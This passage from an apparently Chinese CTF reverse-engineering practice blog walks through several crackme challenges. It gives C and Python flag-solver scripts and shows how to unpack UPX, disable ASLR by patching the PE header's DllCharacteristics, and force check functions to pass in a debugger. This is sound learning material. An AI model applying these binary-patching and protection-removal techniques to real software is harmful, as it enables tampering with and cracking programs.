class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(',27h,'&amp;%$#\"! "</span>; </span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"DDCTF&#123;reverseME&#125;"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(b); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a); j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] == b[i])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j + <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做完后,开始去了解 <strong>ASLR</strong>, 知道了开启ASLR的PE文件会多了一个.reloc节区, 且IMAGE_OPTIONAL_HEADER32结构中的DllCharacteristics多了一个属性. 如果一个程序开启了ASLR保护, 我们可以将这个DllCharacteristics的值从<strong>8140</strong>改为<strong>8100</strong>从而关闭ASLR.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430204438115-1590490290134-1591162198441.png" alt="image-20200430204438115-1590490290134"></p><p><strong>总结: (1)一个程序中的参数可能会以寄存器的来传递 (2)字符串中注意 \ 字符, 要用 \\来表示 \ 字符. (3)程序的ASLR的开启标志及关闭方法.</strong> </p><h3 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h3><p>首先查壳, 发现无壳. 打开程序看一下.   果然是一个游戏, 简单的看了一下, 是让我们在规定时间输入屏幕上显示的字符. </p><p>ida打开, 看伪代码, 很冗长,  向下浏览一下可以看见好几个判断函数. 且都是一个函数, 程序肯定不应该是退出. 我们的目的就是让它的返回值为 <strong>非0</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501104557726-1590490317124-1591162209414.png" alt="image-20200501104557726-1590490317124"></p><p>进入 sub_401507 看看. 发现还有个判断的地方, <strong>我们的目的: 让它返回1</strong> 记录下地址. <strong>0x00401563</strong>. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501105251204-1590490324745-1591162219087.png" alt="image-20200501105251204-1590490324745"></p><p>此时程序下面还有类似的判断函数, 那么相同的方法, 先找到地址, 记录下来.</p><p>最后发现, 程序的核心判断函数就只有2个.  地址分别为:  <strong>0x00401563</strong> ,  <strong>0x004014DB</strong> </p><p>把程序载入OD. 跳到我们找到的地址, 发现地址对不上, 那程序是开启了 ASLR 的, 但是 RVA 是一样的, 简单的算一下就可以了.   另外一个地址, 相同的操作.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501110440340-1590490372567-1591162227662.png" alt="image-20200501110440340-1590490372567"></p><p>最后F9运行, 游戏进行一段时间, 出现flag. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501110942866-1591162259944.png" alt="image-20200501110942866"></p><p><strong>总结: 简单的动态调试的应用, 注意地址是不是 image base.</strong></p><h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>首先查壳, 发现是 upx. 载入OD, 准备脱壳, 但是发现 <strong>VA</strong> 不是默认加载的0x400000, 应该是开启了 ASLR.  转到010editor,找到 <strong>struct DLL_CHARACTERISTICS DllCharacteristics</strong>, 将8140改为8100.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502082437777-1590490407479-1591162332414.png" alt="image-20200502082437777-1590490407479"></p><p>接下来, 重新载入OD,使用堆栈平衡找到程序 EOP, 然后 dump.</p><p>脱壳后载入IDA, 程序逻辑简单, 首先限制长度 &lt;= 37, 然后一个判断函数, 我们进入: 算法也不难.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502083116266-1590490428595-1591162345446.png" alt="image-20200502083116266-1590490428595"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;</span><br><span class="line">   <span class="number">50</span>,  <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = &#123;</span><br><span class="line">   <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;</span><br><span class="line">   <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>,  <span class="number">72</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = <span class="number">0</span>, temp1 = <span class="number">0</span>, q = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"> temp = (j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>; </span><br><span class="line"> temp1 = (<span class="number">16</span>*j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>;</span><br><span class="line"> q = a[<span class="number">2</span>*i];</span><br><span class="line"> <span class="keyword">if</span>(q &lt; <span class="number">48</span> || q &gt; <span class="number">57</span>)</span><br><span class="line"> q = q<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">q = q<span class="number">-48</span>;</span><br><span class="line">q = q*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">w = b[<span class="number">2</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(w &lt; <span class="number">48</span> || w &gt; <span class="number">57</span>)</span><br><span class="line">w = w<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">w = w<span class="number">-48</span>; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(c[<span class="number">16</span>*temp + temp1] == ((w+q) ^ <span class="number">0x19</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502083319440-1590490435324-1591162365723.png" alt="image-20200502083319440-1590490435324"></p><p><strong>总结: &gt;&gt; 运算符移动n位就相当于除以2^n. 且 % 的优先级大于 &gt;&gt;</strong></p><h3 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h3><p>自己算法太菜了, 这道题的2个函数始终没看懂… 看了writeup, 杨辉三角形!</p><p>看了writeup, 自己慢慢的分析了下. 首先, check1函数.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502131757195-1590490442991-1591162417995.png" alt="image-20200502131757195-1590490442991"></p><p>然后是check2.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502133008194-1590490446814-1591162443875.png" alt="image-20200502133008194-1590490446814"></p><p>经过这2个函数判断, 就能知道是否是杨辉三角形了. 把前20行的数据经过md5加密就是flag.</p><p>最后, 题自己虽然每做出来, 倒是通过这个题重新认识了杨辉三角形. 写了C语言和python的版本. 也是想打印出来看看, 且自己刚接触python, 代码乱而长.</p><p><strong>python3:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createL</span><span class="params">(l)</span>:</span></span><br><span class="line">    L = [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len(l)):</span><br><span class="line">        L.append(l[x] + l[x<span class="number">-1</span>])</span><br><span class="line">    L.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printL</span><span class="params">(L, W)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x) + <span class="string">" "</span></span><br><span class="line">    print(s.center(W))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_</span><span class="params">(s, L)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">L = [<span class="number">1</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">row = int(input(<span class="string">"请输入行数: "</span>))</span><br><span class="line">width =row* <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(row):</span><br><span class="line">    printL(L, width)</span><br><span class="line">    s = str_(s, L)</span><br><span class="line">    L = createL(L)</span><br><span class="line">print(s)</span><br><span class="line">m = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">print(<span class="string">"md5加密后:%s"</span> % m)</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">creat</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(lenth+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; lenth; i++)</span><br><span class="line">p[i] = L[i<span class="number">-1</span>] + L[i];</span><br><span class="line"></span><br><span class="line">p[lenth] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> blank_l, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; blank_l; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  "</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%4d"</span>, L[i]); </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">translate</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>), temp[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">"%d"</span>, L[i]);</span><br><span class="line"><span class="built_in">strcat</span>(p, temp); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入行数: "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = creat(p, i);</span><br><span class="line"><span class="built_in">print</span>(p, n-i, i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcat</span>(a, (<span class="keyword">char</span> *)translate(p, i+<span class="number">1</span>));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n所有数值组成的字符串为: %s"</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结: 在看不懂代码的时候, 应该把能写出来的值都列举出来, 